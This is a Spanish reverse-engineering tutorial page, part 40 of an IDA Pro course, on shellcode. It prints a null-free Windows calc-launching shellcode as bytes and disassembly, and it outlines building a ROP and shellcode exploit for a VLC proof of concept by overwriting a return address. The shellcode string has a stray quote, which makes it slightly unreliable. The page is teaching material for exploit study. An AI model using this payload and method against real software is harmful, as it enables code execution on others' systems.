@@ -1,0 +1,136 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tute 40 · Shellcode — Curso IDA</title>
+<meta name="description" content="Tutorial ilustrado del tute 40 del Curso IDA desde cero: Shellcode.">
+<link rel="stylesheet" href="../guia/estilo.css">
+</head>
+<body>
+<a class="salto" href="#contenido">Saltar al contenido</a>
+<header class="cabecera">
+  <div class="marca"><a href="../00_EMPEZAR_AQUI.html">CLS · Curso de reversing</a> <span class="edicion">edición 5 · 27/10/2026</span></div>
+  <nav class="principal" aria-label="Navegación principal">
+    <a href="../00_EMPEZAR_AQUI.html">Inicio</a>
+    <a href="../guia/index.html">Curso</a>
+    <a href="../fichas/index.html">Fichas</a>
+    <a href="../glosario.html">Glosario</a>
+    <a href="../preguntas_y_respuestas.html">Repaso</a>
+  </nav>
+</header>
+<main id="contenido">
+<p class="migas"><a href="../ida-tutes.html">← Índice de los 69 tutes de IDA</a></p>
+<h1>Tute 40 · Shellcode</h1>
+<p class="meta-tute"><strong>⏱ 5 min de lectura</strong> · 843 palabras · 5 capturas · grupo: Vulnerabilidades y exploiting en user-mode (VLC/CVE, DEP, Mona, canary/SEH, shellcode, heap)</p>
+<aside class="callout nota"><p class="callout-titulo">Qué enseña</p><p>Tipos de shellcode y su rol en el exploit (con nota de compatibilidad).</p></aside>
+<p><em>se conecta con:</em> <a href="../guia/05-vulnerabilidades.html">Vulnerabilidades (defensivo)</a></p>
+<aside class="callout aviso"><p class="callout-titulo">Material observado, no reescrito</p><p>Es el texto y las capturas del <code>.docx</code> original del curso, solo presentados como tutorial. Puede tener erratas de origen. El autor del curso es Ricardo Narvaja.</p></aside>
+<hr>
+<p>INTRODUCCIÓN AL REVERSING CON IDA PRO DESDE CERO PARTE 40.</p>
+<p>SHELLCODE UNIVERSAL</p>
+<p>NOTA: En alguna versión moderna de Windows 10 puede haber dejado de funcionar.</p>
+<p>Existen miles de tipos de shellcodes, cada uno de acuerdo al objetivo que se tiene al hacer el exploit.</p>
+<p>Hay shellcodes que son para probar que se puede ejecutar código después de la explotación, normalmente estos ejecutan una calculadora y nada más.</p>
+<p>Obviamente hay shellcodes mucho más complejos que abren consolas remotas, tratan de permanecer en el sistema a pesar de que el programa explotado crashee o se cierre, inyectándose en algún otro proceso del sistema, guardándose como archivo etc.</p>
+<p>Hay una biblioteca de shellcodes que buscando en Google podemos encontrar o podríamos programar si necesitamos algo especifico.</p>
+<p>Nosotros usaremos a partir de ahora un SHELLCODE UNIVERSAL que sirve para todas las versiones de Windows y que ejecuta la calculadora, con eso demostraremos ejecución de código.</p>
+<p>El mismo salio de aquí.</p>
+<p>https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html</p>
+<p>shellcode="\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b"\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"</p>
+<p>Así como esta lo puedo usar en un script de Python siempre y cuando tenga lugar en la memoria para ingresarlo.</p>
+<p>Los bytes sueltos son:</p>
+<p>31 db 64 8b 7b 30 8b 7f 0c 8b 7f 1c 8b 47 08 8b 77 20 8b 3f 80 7e 0c 33 75 f2 89 c7 03 78 3c 8b" 57 78 01 c2 8b 7a 20 01 c7 89 dd 8b 34 af 01 c6 45 81 3e 43 72 65 61 75 f2 81 7e 08 6f 63 65 73 75 e9 8b 7a 24 01 c7 66 8b 2c 6f 8b 7a 1c 01 c7 8b 7c af fc 01 c7 89 d9 b1 ff 53 e2 fd 68 63 61 6c 63 89 e2 52 52 53 53 53 53 53 53 52 53 ff d7</p>
+<pre class='asm'>MOV EDI,DWORD PTR FS:[EBX+30]
+XOR EBX,EBX
+MOV EDI,DWORD PTR DS:[EDI+C]
+MOV EDI,DWORD PTR DS:[EDI+1C]
+MOV EAX,DWORD PTR DS:[EDI+8]
+MOV ESI,DWORD PTR DS:[EDI+20]
+MOV EDI,DWORD PTR DS:[EDI]
+CMP BYTE PTR DS:[ESI+C],33
+JNZ SHORT CANARY_c.00A7138A
+MOV EDI,EAX
+ADD EDI,DWORD PTR DS:[EAX+3C]
+MOV EDX,DWORD PTR DS:[EDI+78]
+ADD EDX,EAX
+MOV EDI,DWORD PTR DS:[EDX+20]
+ADD EDI,EAX
+MOV EBP,EBX
+MOV ESI,DWORD PTR DS:[EDI+EBP*4]
+ADD ESI,EAX
+INC EBP
+CMP DWORD PTR DS:[ESI],61657243
+JNZ SHORT CANARY_c.00A713A9
+CMP DWORD PTR DS:[ESI+8],7365636F
+JNZ SHORT CANARY_c.00A713A9
+MOV EDI,DWORD PTR DS:[EDX+24]
+ADD EDI,EAX
+MOV BP,WORD PTR DS:[EDI+EBP*2]
+MOV EDI,DWORD PTR DS:[EDX+1C]
+ADD EDI,EAX
+MOV EDI,DWORD PTR DS:[EDI+EBP*4-4]
+ADD EDI,EAX
+MOV ECX,EBX
+MOV CL,0FF
+PUSH EBX</pre>
+<p>LOOPD SHORT CANARY_c.00A713D8</p>
+<pre class='asm'>PUSH 636C6163
+MOV EDX,ESP
+PUSH EDX
+PUSH EDX
+PUSH EBX
+PUSH EBX
+PUSH EBX
+PUSH EBX
+PUSH EBX
+PUSH EBX
+PUSH EDX
+PUSH EBX
+CALL EDI</pre>
+<p>Eso ejecuta la calculadora en cualquier lugar que lo peguemos, tiene de bueno que no tiene ceros, aunque puede haber programas que rechacen algún otro carácter, eso dependerá del caso.</p>
+<p>Ya sabemos hacer ROP y ya tenemos un shellcode universal, la idea es que practiquen con el programa VLC que dejamos hecho el POC, me haría muy feliz que alguno me mande el archivo completo y un tute explicando lo que hicieron, lo agregaría aquí como una parte, al primero que envíe al exploit con un tuto bien explicado.</p>
+<p>El rop lo pueden hacer a mano o con mona no hay problema deben buscar a ver si hay dlls sin ASLR y si hay más de una sin ASLR, el mona tiene para pasar más de una dll como argumento, para armar el ROP combinando ambas.</p>
+<p>En cuanto al script de Python les daré un esquema una vez que arman el ROP, abren el archivo POC.ty+</p>
+<figure><img loading="lazy" src="img/40/1.png" alt="Captura 1 del tute 40"></figure>
+<p>Y buscan el 41424344 que quedaba pisando el RETURN ADDRESS.</p>
+<figure><img loading="lazy" src="img/40/2.png" alt="Captura 2 del tute 40"></figure>
+<p>Y ahí según el largo del ROP +SHELLCODE pongamos como ejemplo que el ROP y SHELLCODE miden 150 bytes, reemplazo una zona un poco mayor a partir del 41424344 incluido él mismo pongámosle 160 bytes.</p>
+<p>Voy marcando hacia abajo hasta que obtengo la zona marcada del largo que necesito.</p>
+<figure><img loading="lazy" src="img/40/3.png" alt="Captura 3 del tute 40"></figure>
+<p>Relleno la zona seleccionada con 90s.</p>
+<figure><img loading="lazy" src="img/40/4.png" alt="Captura 4 del tute 40"></figure>
+<p>Chequeo bien el largo de la zona de 90s, que sea mayor al largo de ROP más SHELLCODE y que sea un valor conocido, lo anoto en mi caso 160.</p>
+<figure><img loading="lazy" src="img/40/5.png" alt="Captura 5 del tute 40"></figure>
+<p>Ahí hay un esquema del script no está probado ni nada, no funcionara, no tiene definido el ROP ni el SHELLCODE, pueden usar el SHELLCODE UNIVERSAL que acabamos de ver si no hay problemas con ningún carácter sino deberán buscar otro.</p>
+<p>La idea es que el script abre el archivo con los 90, los reemplaza como una fruta del mismo largo que contiene al inicio el ROP y el SHELLCODE y relleno, y luego lo guarda para probarlo, si funciona será el exploit, sino habrá que tracear a ver que falla, jeje.</p>
+<p>La verdad me pondría muy contento y vería que tanto escribir no es inútil, si alguien hace un tute y manda el exploit funcional.</p>
+<p>El primero que envíe lo pondré como parte del curso, si hay más de uno los subiré dentro de la carpeta SOLUCIONES del curso que creare para esto en las webs (si es necesario jeje)</p>
+<p>Hasta la parte 41 a ver si practican y hallan una solución.</p>
+<p>Ricardo Narvaja</p>
+</main>
+<footer class="pie">
+  <p>Material educativo y defensivo. Las prácticas se limitan a programas propios, software abierto o crackmes diseñados para aprender. No se enseña a eludir licencias, DRM ni controles de acceso.</p>
+  <p><a href="../00_EMPEZAR_AQUI.html">Inicio</a> · <a href="../guia/etapa-0.html">Etapas</a> · <a href="../fuentes_y_limites.html">Fuentes y límites</a> · <a href="../registro_de_cobertura.csv">Registro de cobertura</a></p>
+</footer>
+<script>
+(function(){
+  function abrir(src){
+    var o=document.createElement('div'); o.className='lightbox-ov';
+    var i=document.createElement('img'); i.src=src; o.appendChild(i);
+    function cerrar(){o.remove(); document.removeEventListener('keydown', onkey);}
+    function onkey(e){ if(e.key==='Escape') cerrar(); }
+    o.addEventListener('click', cerrar);
+    document.addEventListener('keydown', onkey);
+    document.body.appendChild(o);
+  }
+  document.addEventListener('DOMContentLoaded', function(){
+    document.querySelectorAll('figure img, main img').forEach(function(img){
+      img.style.cursor='zoom-in';
+      img.addEventListener('click', function(){ abrir(img.currentSrc||img.src); });
+    });
+  });
+})();
+</script>
+</body>
+</html>
